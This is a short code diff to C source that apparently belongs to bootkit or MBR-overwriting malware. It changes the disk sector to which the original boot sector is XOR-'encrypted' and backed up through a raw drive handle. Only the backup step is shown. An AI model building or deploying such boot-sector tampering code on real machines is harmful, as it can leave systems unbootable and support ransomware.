@@ -98,7 +98,7 @@ int main()
 	}
 
 
-	//"encrypt" the original bootsector, and write it to sector 15
+	//"encrypt" the original bootsector, and write it to sector 18
 	for (int i = 0; i < 512; i++)
 	{
 		char temp = bootSectorBackup[i] ^ 0x28;
@@ -106,7 +106,7 @@ int main()
 
 	}
 
-	if (!Write(driveHandle, 15, sizeof(bootSectorEncrypted), bootSectorEncrypted))
+	if (!Write(driveHandle, 18, sizeof(bootSectorEncrypted), bootSectorEncrypted))
 	{
 		printf("[*] Backup Write failed\r\n");
 		CloseHandle(driveHandle);
